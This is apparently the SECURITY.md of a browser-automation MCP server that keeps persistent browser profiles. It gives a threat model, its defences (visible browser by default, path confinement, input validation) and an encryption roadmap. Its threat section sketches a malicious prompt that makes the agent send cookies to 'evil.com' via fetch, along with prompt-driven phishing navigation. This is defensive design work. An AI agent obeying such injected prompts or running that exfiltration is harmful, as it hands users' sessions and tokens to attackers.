# Security

## Threat model

`mysupportdetails-mcp` manages **persistent browser profiles** that contain:
- Session cookies (active login tokens)
- localStorage (JWT, refresh tokens)
- IndexedDB
- HTTP cache (often includes images, API responses)
- Browsing history

**Anyone with read access to the local filesystem has full access to everything above**, same as for the system Chrome/Firefox profile.

## What we do NOT do (by choice, v0.x)

- **No encryption at-rest**: files under `~/.msd/profiles/` are stored in clear. An attacker with filesystem read access can:
  - Copy the cookie folder and replay sessions on another machine
  - Extract JWT tokens from localStorage
  - Hijack SSO sessions
- **No sandboxing beyond the browser's native sandbox**: navigated pages have the same privileges as a regular Chrome/Firefox session.
- **No audit trail of MCP actions**: who invoked which tool, when, with which parameters is not logged.

The choices above are **intentional for the MVP**. See ROADMAP.md for the v2 opt-in encryption feature.

## What we do

### Browser ALWAYS visible by default (security-first)

The browser opens in **headed** mode (visible window) by default. It is not a UX choice, it is a security choice:

- **The user sees in real time what the agent is doing.** If a malicious prompt sends the browser to a phishing site, the user sees it immediately and kills it.
- **No silent execution.** Zero risk that the agent fills forms / clicks buttons / accepts cookie banners in the background with no visual consent.
- **Immediate debug.** Playwright errors, unexpected popups, and strange redirects are visible without having to enable screenshots after the fact.

The opt-in to headless (env var `MSD_HEADLESS=1` or per-call parameter `headed: false`) is documented but **requires explicit user action**. There is no way to enable it through a malicious prompt because it is neither an exposed tool nor a runtime config flag.

The `headed: true` default is protected by a required unit test in CI (see ARCHITECTURE.md).

### Path confinement
`profile-store.resolvePath(browser, name)` validates that the profile name:
- does not contain `..`, `/`, `\`, `\0`
- matches the regex `^[a-zA-Z0-9._-]{1,64}$`
- resolves (post-realpath) under `~/.msd/profiles/`

This prevents a malicious agent prompt from writing outside the profile store (path traversal).

### No eval of sensitive prompts
- `browser_evaluate` runs JS **in the page context of the loaded web page**, not in the server's Node process. The browser sandbox isolation is respected.
- Tool parameters are validated with a Zod schema before being passed to Playwright.

### Isolation between profiles
Each profile has its own Playwright dir. Cookies, cache, and storage are isolated at the filesystem level. No cross-contamination.

### Best practices recommended to the user

In the README + the initial prompt shown on first run:

```
IMPORTANT:
- mysupportdetails-mcp stores browser cookies and sessions in clear under ~/.msd/.
- Do not run on shared machines without disk encryption.
- Do not save critical credentials into a mysupportdetails-mcp profile (banking, corporate,
  production admin panel).
- A mysupportdetails-mcp profile is equivalent to a Chrome/Firefox profile: whoever reads
  the filesystem has access to your active logins.
- For security-sensitive scenarios, wait for the v2.0 opt-in encryption feature.
```

### What prevents a malicious prompt from

**Exfiltrating cookies to a remote server**
A prompt that asks the agent to read cookies via `browser_evaluate` + `fetch("evil.com", {body: cookies})` would work **only if the visited site allows it from page JS**. This is the browser's standard cross-origin isolation: `document.cookie` is accessible only to the cookie's owning domain. `HttpOnly` cookies are not readable from JS at all.

This is not a mysupportdetails-mcp flaw ... it is the standard web security model.

**Deleting other profiles**
The `profile_delete` tool is callable but only acts on paths under `~/.msd/profiles/`. Impossible to touch the external filesystem through this tool.

**Uploading arbitrary files to a site**
`browser_type` inserts text, not files. Uploads would require a future `browser_file_upload` (not present in v0.1.0). When/if we add it, the uploaded file path will be validated.

## Cross-platform notes

### macOS
- Playwright downloads binaries from Microsoft's CDN on first `install`. Bundled signature check.
- The system Chrome/Firefox profile lives in ~/Library/Application Support/Google/Chrome ... mysupportdetails-mcp does NOT touch that path.

### Linux
- If you have `SELinux` in enforcing mode, it may block headed Playwright. Whitelist the Node context.
- Sandbox namespace: Chromium requires `--no-sandbox` in some CI setups. The flag is available but discouraged in dev.

### Windows
- Windows Defender may flag the bundled Playwright Chromium as suspicious on first download. Add an exception for `%USERPROFILE%\.cache\ms-playwright`.
- The `\` path separator is handled by Node ... mysupportdetails-mcp never hardcodes `/`.

## Vulnerability disclosure

Security vulnerabilities should be sent privately to: `security@kuramalab.dev` (email to be configured).

Do not open public issues for vulnerabilities.

Target response: 48h before triage, patch within 7 days for HIGH/CRITICAL.

## v2 encryption roadmap

Opt-in `--encrypt` feature:
- AES-256-GCM over every at-rest profile file
- Master key in the native OS keychain:
  - macOS: Keychain Services
  - Linux: `libsecret` (GNOME Keyring / KDE Wallet)
  - Windows: DPAPI (Credential Manager)
- Automatic unlock if the user has an active OS session
- Fallback password prompt on profile open

Not in the MVP so the launch is not delayed. Priority v2.0.
